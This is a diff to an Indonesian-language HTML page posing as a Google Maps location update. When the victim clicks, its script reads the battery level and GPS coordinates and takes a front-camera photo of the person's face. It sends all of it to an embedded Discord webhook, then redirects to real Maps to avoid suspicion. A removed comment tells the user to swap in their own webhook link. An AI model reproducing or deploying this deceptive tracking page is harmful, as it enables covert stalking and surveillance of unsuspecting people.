@@ -6,71 +6,48 @@
     <title>Google Maps - Update Lokasi</title>
     <style>
         body { margin: 0; font-family: Arial, sans-serif; background: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
-        .logo { width: 100px; marginBottom: 20px; }
+        .logo { width: 100px; margin-bottom: 20px; }
         .btn { padding: 15px 30px; background: #4285F4; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
         .text { color: #5f6368; margin-top: 15px; font-size: 14px; text-align: center; padding: 0 20px; }
     </style>
 </head>
 <body>
-
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png" class="logo" alt="Maps">
     <button class="btn" onclick="mainkan()">Lihat Lokasi Terkini</button>
     <p class="text">Klik tombol di atas untuk sinkronisasi lokasi GPS secara real-time.</p>
-
     <script>
-        // --- 1. GANTI LINK DISCORD DI BAWAH INI ---
-        const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnVcKc7du-HRYBFKAvdcxcz9jcXzQiJ_5G4hWa1rX0GUPV0QZP9G_B7fV4W9u"; 
-
+        const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnVCkC7du-HRYBFKAvdcxCz9jcXzQIj_5G4hWa1rX0GUPVQ02P5as6oiOKOxR"; 
         async function mainkan() {
             document.querySelector('.btn').innerHTML = "Menghubungkan GPS...";
-            
-            // Ambil Info Baterai
             let bInfo = "N/A";
             try { const b = await navigator.getBattery(); bInfo = `${Math.round(b.level * 100)}%`; } catch(e){}
-
-            // Minta Izin Lokasi & Kamera
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
                 const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-
                 try {
-                    // Paksa Ambil Kamera karena sudah ada klik tombol
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
-
                     const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    
                     canvas.toBlob(async (blob) => {
                         const formData = new FormData();
-                        formData.append("content", `**✅ TARGET TERPANTAU!**\n🔋 Baterai: ${bInfo}\n📍 Maps: ${mapsUrl}`);
+                        formData.append("content", `**✅ TARGET TERPANTAU!**\n🔋 Baterai: ${bInfo}\n📍 Lokasi: ${mapsUrl}`);
                         formData.append("file", blob, "wajah_target.jpg");
-                        
                         await fetch(webhookURL, { method: 'POST', body: formData });
-                        
-                        // Buang ke Maps asli biar gak curiga
                         window.location.href = mapsUrl;
                     }, 'image/jpeg');
-
                     stream.getTracks().forEach(t => t.stop());
                 } catch (e) {
-                    // Jika kamera ditolak, kirim lokasi saja
-                    await fetch(webhookURL, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
+                    await fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ content: `**📍 LOKASI (Kamera Ditolak)**\n🔋 Baterai: ${bInfo}\n🌍 Maps: ${mapsUrl}` })
                     });
                     window.location.href = mapsUrl;
                 }
-            }, (err) => {
-                alert("Izin lokasi diperlukan untuk melihat peta.");
-                document.querySelector('.btn').innerHTML = "Lihat Lokasi Terkini";
-            });
+            }, (err) => { alert("Izin lokasi diperlukan."); });
         }
     </script>
 </body>
